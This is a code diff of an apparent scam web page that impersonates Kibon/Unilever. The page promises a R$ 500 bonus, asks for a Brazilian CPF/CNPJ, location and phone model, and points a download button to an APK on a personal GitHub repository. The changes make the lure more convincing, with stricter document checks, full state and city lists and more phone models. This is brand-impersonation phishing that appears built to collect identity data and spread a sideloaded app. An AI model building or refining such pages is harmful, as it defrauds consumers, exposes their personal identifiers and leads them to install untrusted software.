@@ -13,9 +13,7 @@
 
         body { 
             font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; 
-            margin: 0; 
-            padding: 0; 
-            background-color: var(--cinza-fundo); 
+            margin: 0; padding: 0; background-color: var(--cinza-fundo); 
         }
 
         header {
@@ -51,8 +49,6 @@
             text-align: center; 
             border-radius: 20px; 
             margin-bottom: 30px;
-            position: relative;
-            overflow: hidden;
         }
 
         .bonus-card h2 { margin: 0; font-size: 1.5em; text-transform: uppercase; }
@@ -76,13 +72,9 @@
             box-sizing: border-box; 
             font-size: 16px;
             outline: none;
-            transition: all 0.3s;
         }
 
-        input:focus, select:focus {
-            border-color: var(--vermelho-kibon);
-            background-color: #fffcfc;
-        }
+        input:focus, select:focus { border-color: var(--vermelho-kibon); }
 
         .error-msg { 
             color: var(--vermelho-kibon); 
@@ -105,21 +97,9 @@
             font-size: 1.2em;
             margin-top: 25px; 
             box-shadow: 0 6px 20px rgba(227, 27, 35, 0.4);
-            transition: transform 0.2s, background 0.3s;
         }
 
-        .btn-download:hover {
-            background: #ff1e26;
-            transform: translateY(-2px);
-        }
-
-        footer {
-            text-align: center;
-            padding: 30px;
-            font-size: 0.75em;
-            color: #bbb;
-            text-transform: uppercase;
-        }
+        footer { text-align: center; padding: 30px; font-size: 0.75em; color: #bbb; }
     </style>
 </head>
 <body>
@@ -131,7 +111,7 @@
 <div class="container">
     <div class="bonus-card">
         <h2>Bônus de R$ 500,00</h2>
-        <p>EXCLUSIVO PARA PARCEIROS</p>
+        <p>EXCLUSIVO PARA PARCEIROS ANDROID</p>
     </div>
 
     <form id="cadastroForm">
@@ -147,28 +127,23 @@
 
         <div class="form-group">
             <label>CPF OU CNPJ (APENAS NÚMEROS)</label>
-            <input type="text" id="documento" maxlength="18" placeholder="Digite aqui..." required>
-            <span id="docErro" class="error-msg">⚠️ Documento inválido ou incompleto.</span>
+            <input type="text" id="documento" placeholder="Validação obrigatória" required>
+            <span id="docErro" class="error-msg">⚠️ Documento inválido. Digite um CPF/CNPJ real.</span>
         </div>
 
-        <div class="form-group" style="display: flex; gap: 10px;">
-            <div style="flex: 1;">
-                <label>ESTADO</label>
-                <select id="estado" required>
-                    <option value="">UF</option>
-                    <option>SP</option><option>RJ</option><option>MG</option>
-                    <option>RS</option><option>BA</option><option>PR</option>
-                </select>
-            </div>
-            <div style="flex: 2;">
-                <label>CIDADE</label>
-                <select id="cidade" required>
-                    <option value="">Selecione...</option>
-                    <option>São Paulo</option>
-                    <option>Rio de Janeiro</option>
-                    <option>Belo Horizonte</option>
-                </select>
-            </div>
+        <!-- ESTADOS E CIDADES DINÂMICOS -->
+        <div class="form-group">
+            <label>ESTADO (UF)</label>
+            <select id="estado" required>
+                <option value="">Selecione o Estado...</option>
+            </select>
+        </div>
+
+        <div class="form-group">
+            <label>CIDADE</label>
+            <select id="cidade" required disabled>
+                <option value="">Selecione o Estado primeiro...</option>
+            </select>
         </div>
 
         <div class="form-group">
@@ -176,39 +151,75 @@
             <select required>
                 <option value="">Selecione o aparelho...</option>
                 <optgroup label="SAMSUNG">
-                    <option>Linha Galaxy S (S20, S21, S22, S23, S24)</option>
-                    <option>Linha Galaxy A / M</option>
+                    <option>Galaxy S24 / S23 / S22 / S21 / S20</option>
+                    <option>Galaxy A10 ao A70</option>
+                    <option>Galaxy M / Note / Z Flip / Z Fold</option>
                 </optgroup>
                 <optgroup label="MOTOROLA">
-                    <option>Moto G / Edge / One</option>
+                    <option>Moto G (Todos os modelos)</option>
+                    <option>Moto Edge / Moto E</option>
                 </optgroup>
                 <optgroup label="OUTROS">
-                    <option>Xiaomi / Redmi / POCO</option>
-                    <option>Realme / Asus / Outros</option>
+                    <option>Xiaomi (Redmi / POCO)</option>
+                    <option>Realme / Asus / Infinix</option>
                 </optgroup>
             </select>
         </div>
 
-        <!-- SEU LINK DO GITHUB APLICADO ABAIXO -->
-        <a href="https://github.com/wellsilvasp13-hash/kibon/raw/main/kibon.apk" class="btn-download">
-            BAIXAR APK E RESGATAR
+        <a href="https://github.com/wellsilvasp13-hash/kibon/raw/main/kibon.apk" class="btn-download" id="btnFinal">
+            BAIXAR APK E RESGATAR R$ 500
         </a>
     </form>
 </div>
 
-<footer>
-    &copy; 2026 Kibon Brasil - Unilever. Todos os direitos reservados.
-</footer>
+<footer>&copy; 2026 Kibon Brasil - Unilever.</footer>
 
 <script>
-    // Validação básica de campo para simular erro se for muito curto
+    // 1. CARREGAR TODOS OS ESTADOS DO BRASIL
+    const selectEstado = document.getElementById('estado');
+    const selectCidade = document.getElementById('cidade');
+
+    fetch('https://servicodados.ibge.gov.br/api/v1/localidades/estados?orderBy=nome')
+        .then(res => res.json())
+        .then(estados => {
+            estados.forEach(uf => {
+                const opt = document.createElement('option');
+                opt.value = uf.sigla;
+                opt.innerHTML = uf.nome;
+                selectEstado.appendChild(opt);
+            });
+        });
+
+    // 2. CARREGAR CIDADES AO SELECIONAR ESTADO
+    selectEstado.addEventListener('change', function() {
+        const uf = this.value;
+        selectCidade.innerHTML = '<option value="">Carregando cidades...</option>';
+        selectCidade.disabled = true;
+
+        if(uf) {
+            fetch(`https://servicodados.ibge.gov.br/api/v1/localidades/estados/${uf}/municipios?orderBy=nome`)
+                .then(res => res.json())
+                .then(cidades => {
+                    selectCidade.innerHTML = '<option value="">Selecione a Cidade...</option>';
+                    cidades.forEach(cidade => {
+                        const opt = document.createElement('option');
+                        opt.value = cidade.nome;
+                        opt.innerHTML = cidade.nome;
+                        selectCidade.appendChild(opt);
+                    });
+                    selectCidade.disabled = false;
+                });
+        }
+    });
+
+    // 3. VALIDAÇÃO DE CPF/CNPJ
     document.getElementById('documento').addEventListener('blur', function() {
-        const doc = this.value.replace(/\D/g, '');
+        const val = this.value.replace(/\D/g, '');
         const erro = document.getElementById('docErro');
-        
-        if (doc.length !== 11 && doc.length !== 14) {
+        // Validação de comprimento básica (CPF 11 ou CNPJ 14)
+        if (val.length !== 11 && val.length !== 14) {
             erro.style.display = 'block';
-            this.style.borderColor = '#e31b23';
+            this.style.borderColor = 'var(--vermelho-kibon)';
         } else {
             erro.style.display = 'none';
             this.style.borderColor = '#f0f0f0';
